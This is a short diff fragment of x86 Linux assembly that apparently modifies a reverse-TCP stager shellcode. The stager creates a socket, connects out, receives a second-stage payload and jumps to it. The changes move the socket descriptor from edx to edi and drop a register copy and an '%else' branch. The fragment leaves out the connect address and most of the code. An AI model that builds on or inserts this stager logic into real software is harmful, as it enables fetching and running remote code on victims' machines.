@@ -34,7 +34,7 @@ socket:
 	pop  eax
 	mov  ecx, esp
 	int  0x80
-	xchg eax, edx
+	xchg eax, edi
 
 connect:
 	pop  ebx
@@ -46,7 +46,7 @@ connect:
 	pop  eax
 	push eax
 	push ecx
-	push edx
+	push edi
 	mov  ecx, esp
 	inc  ebx
 	int  0x80
@@ -59,10 +59,6 @@ recv:
 	mov  dh, 0xc
 	mov  al, 0x3
 	int  0x80
-	mov  edi, ebx         ; not necessary if second stages use ebx instead of 
-	                      ; edi for fd
 	jmp  ecx
 
-%else
-	pop  edi
 %endif
